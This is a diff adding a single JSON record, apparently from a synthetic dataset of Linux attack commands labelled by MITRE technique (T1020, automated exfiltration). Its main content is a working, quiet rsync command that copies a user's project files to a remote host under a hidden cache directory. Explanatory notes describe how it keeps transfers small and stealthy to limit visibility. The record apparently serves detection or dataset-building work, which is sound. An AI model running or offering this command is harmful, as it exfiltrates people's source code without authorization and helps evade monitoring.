@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "rsync -azq --size-only --max-size=5m --exclude='.git/' $HOME/Projects/ backup@media.example.net:.cache/.pj/$HOSTNAME/",
+  "explanation": "Exfiltrates project files while limiting transfers to small files and using size-only change detection to minimize bandwidth and repeated transfers, aligning with T1020.",
+  "rationale_steps": [
+    "Target developer project data excluding VCS directories.",
+    "Use --max-size to keep transfers small and stealthy.",
+    "Rely on --size-only to skip unchanged files quickly.",
+    "Quiet, compressed session for minimal visibility."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-c06565eb",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
